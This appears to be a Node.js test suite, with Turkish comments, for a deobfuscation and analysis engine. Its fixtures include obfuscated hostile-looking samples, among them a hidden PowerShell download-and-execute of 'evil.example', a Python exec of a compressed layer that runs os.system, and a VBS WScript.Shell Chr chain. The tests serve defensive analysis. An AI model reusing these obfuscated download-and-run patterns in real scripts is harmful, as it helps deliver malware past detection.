// obfuscation analizi/deobfuscation testleri: SAMPLES=<dizin> node tools/test/obf.mjs
import fs from 'node:fs'; import zlib from 'node:zlib'; import crypto from 'node:crypto'; import { loadEngine, scan } from './engine.mjs';
const E = loadEngine(); let bad = 0; const ok = (c, m) => { console.log((c ? 'OK   ' : 'FAIL ') + m); if (!c) bad++; };
const run = (name, data, o) => E.obf(data instanceof Uint8Array ? data : new Uint8Array(Buffer.from(data)), name, o || {});
const get = (r, re) => r.outputs.find((o) => re.test(o.name));
// 1. JS: kacis + birlestirme + fromCharCode
const hexs = (s) => [...s].map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
const js = `var a = "${hexs('http://evil.example/p')}" + "${hexs('ayload.exe')}"; var b = String.fromCharCode(99,109,100); var _0x1a2b=['x'],_0x3c4d=['y'],_0x5e6f=['z'],_0x7a8b=1,_0x9c0d=2,_0x1e2f=3,_0x3a4b=4,_0x5c6d=5; x['push'](1);`;
let r = await run('s.js', js); ok(r.kind.id === 'js' && r.obfuscation.detected === true, 'JS obfuscation tespit: %' + r.obfuscation.confidence);
let o = get(r, /deobf\.js$/); ok(o && o.text.includes('http://evil.example/payload.exe') && o.text.includes('"cmd"') && o.text.includes('x.push'), 'JS deobf çıktısı'); ok(r.status === 'done' || r.status === 'partial', 'JS durum ' + r.status);
const packed = "eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0 1=\\'2\\';3(1)',10,4,'var|msg|hello|alert'.split('|'),0,{}))";
r = await run('p.js', packed); o = get(r, /deobf\.js$/); ok(o && /var msg\s*=\s*'hello'/.test(o.text) && /alert\(msg\)/.test(o.text), 'Dean Edwards packer açıldı'); ok(r.obfuscation.methods.some((m) => m.id === 'js_packer'), 'packer yöntemi raporlandı');
// 2. temiz JS
r = await run('clean.js', 'function add(a, b) {\n  return a + b;\n}\nconsole.log(add(1, 2));\n'); ok(r.obfuscation.detected === false && !r.outputs.some((x) => /deobf/.test(x.name)), 'temiz JS: obfuscation tespit edilmedi, çıktı yok');
// 3. string array (acilamaz)
const sa = "var _0x1a2b=['a','b','c','d'];(function(_0x1,_0x2){var _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(_0x1a2b,0x1a3));function _0x5c6d(_0x7,_0x8){_0x7=_0x7-0x0;return _0x1a2b[_0x7];}console.log(_0x5c6d('0x1'),_0x5c6d('0x2'),_0x5c6d('0x3'),_0x5c6d('0x1'),_0x5c6d('0x2'),_0x5c6d('0x3'),_0x5c6d('0x1'),_0x5c6d('0x2'));";
r = await run('sa.js', sa); ok(r.obfuscation.detected && r.obfuscation.methods.some((m) => m.id === 'js_stringarray' && m.resolved === false), 'string array: açılamadı olarak işaretlendi'); ok(!r.outputs.some((x) => /deobf/.test(x.name)) || r.status === 'partial', 'string array: başarılıymış gibi gösterilmedi (' + r.status + ')');
// 4. PowerShell
const inner = "Write-Host 'stage2'; IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')";
const b64 = Buffer.from(inner, 'utf16le').toString('base64');
const ps = "I`E`X ('Ne'+'w-Ob'+'ject') ; $x=[char]72+[char]105; \"{1}{0}\" -f 'ell','Sh'; powershell -nop -w hidden -enc " + b64;
r = await run('s.ps1', ps); ok(r.kind.id === 'ps' && r.obfuscation.detected === true, 'PS obfuscation tespit: %' + r.obfuscation.confidence); o = get(r, /deobf\.ps1$/); ok(o && /IEX/.test(o.text) && /'New-Object'/.test(o.text) && !/`/.test(o.text.split('\n')[0]) && /'Shell'/.test(o.text), 'PS dönüşümleri'); const l1 = get(r, /katman1/); ok(l1 && l1.text.includes("DownloadString('http://evil.example/x')"), 'PS base64 UTF-16 katmanı açıldı');
// 5. VBS
const vb = 'Dim s\ns = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\nSet o = CreateObject(s)\nExecute("x=1")\n'; r = await run('a.vbs', vb); o = get(r, /deobf\.vbs$/); ok(o && o.text.includes('"WScript.Shell"'), 'VBS Chr zinciri çözüldü');
// 6. batch
const bat = '@echo off\nset "a=powershell"\np^o^w^e^r^s^h^e^l^l -c ^w^h^o^a^m^i\n%a:~0,5%x\n'; r = await run('a.bat', bat); o = get(r, /deobf\.bat$/); ok(o && /powershell -c whoami/.test(o.text) && /power/.test(o.text), 'batch ^ ve %v:~% çözüldü');
// 7. python
const pyp = "import base64,zlib\nexec(zlib.decompress(base64.b64decode('" + zlib.deflateSync(Buffer.from("print('layer2 payload ok ok ok')\nimport os\nos.system('id')\n")).toString('base64') + "')))\n"; r = await run('a.py', pyp); ok(r.kind.id === 'py' && r.obfuscation.detected === true, 'Python exec(decode) tespiti'); const pl = get(r, /katman1/); ok(pl && /os\.system/.test(pl.text), 'Python zlib+base64 katmanı açıldı (çalıştırılmadı)');
// 8. bilinmeyen / belge / buyuk
r = await run('x.bin', crypto.randomBytes(5000)); ok(r.status === 'unsupported' && r.reason.length > 20, 'bilinmeyen tür açıkça reddedildi: ' + r.reason.slice(0, 40));
r = await run('a.pdf', Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF')); ok(r.status === 'unsupported', 'belge türü desteklenmiyor');
r = await run('big.js', Buffer.alloc(25e6, 0x61)); ok(r.status === 'refused', 'çok büyük dosya durduruldu');
// 9. iptal
r = await run('c.js', js, { signal: { aborted: true } }); ok(r.status === 'cancelled' && r.outputs.every((x) => x.kind === 'report' || x.partial), 'iptal: çıktılar kısmi işaretli');
// 10. ilerleme
const pr = []; await run('s2.js', js, { onProgress: (p) => pr.push(p) }); ok(pr.length >= 3 && pr.every((x, i) => i === 0 || x >= pr[i - 1]), 'ilerleme bildirimi: ' + pr.join(','));
// 11. orijinal bayt degismedi
const orig = new Uint8Array(Buffer.from(js)); const copy = orig.slice(); await run('s.js', orig); ok(Buffer.compare(Buffer.from(orig), Buffer.from(copy)) === 0, 'girdi baytları değiştirilmedi');
// 12. ikili: yerel PE + ELF + java
const S = process.env.SAMPLES; if (S) {
  for (const f of ['pe_inject.exe', 'elf_hello']) { const b = fs.readFileSync(S + '/' + f); const sc = await scan(E, f, b, 'deep'); r = await run(f, b, { scan: sc }); ok(r.supported && r.steps.some((s) => s.id === 'decompile' && s.status === 'unsupported'), f + ': analiz yapıldı, decompile "yapılmıyor" (' + r.status + ')'); }
  for (const f of ['T.class', 't.jar']) if (fs.existsSync(S + '/' + f)) { r = await run(f, fs.readFileSync(S + '/' + f)); ok(r.kind.id.startsWith('j') || r.kind.id === 'java-class', f + ' türü: ' + r.kind.id); const y = get(r, /yapi\.txt$/); ok(y && /class /.test(y.text), f + ' yapı dökümü'); }
}
console.log(bad ? bad + ' TEST BAŞARISIZ' : 'tüm testler geçti'); process.exit(bad ? 1 : 0);
